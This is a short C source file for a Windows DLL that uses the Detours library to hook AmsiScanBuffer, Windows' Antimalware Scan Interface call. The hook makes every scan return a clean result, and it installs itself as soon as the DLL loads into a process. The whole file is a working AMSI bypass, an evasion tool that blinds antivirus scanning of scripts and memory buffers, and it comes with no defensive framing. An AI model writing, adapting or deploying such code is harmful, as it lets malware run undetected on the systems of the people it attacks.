#include <windows.h>
#include <amsi.h>
#include "detours.h"

// NOTE: you will need detours to compile this hook code

// pointer to original AmsiScanBuffer
HRESULT (WINAPI* pOriginalAmsiScanBuffer)(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length,LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT *result) = AmsiScanBuffer;

// Hooking function
HRESULT HookedAmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length,LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT *result) {

	// everything is alright, nothing to see here
	return AMSI_RESULT_CLEAN;
}

// Set hooks on AmsiScanBuffer
BOOL HookAmsiScanBuffer(void) {
    LONG err;

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pOriginalAmsiScanBuffer, HookedAmsiScanBuffer);
	err = DetourTransactionCommit();
	
	return TRUE;
}

// Revert all changes to original code
BOOL UnHookAmsiScanBuffer(void) {
	LONG err;
	
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)pOriginalAmsiScanBuffer, HookedAmsiScanBuffer);
	err = DetourTransactionCommit();
	
	return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {
    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			HookAmsiScanBuffer();
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			UnHookAmsiScanBuffer();
			break;
	}
	
    return TRUE;
}
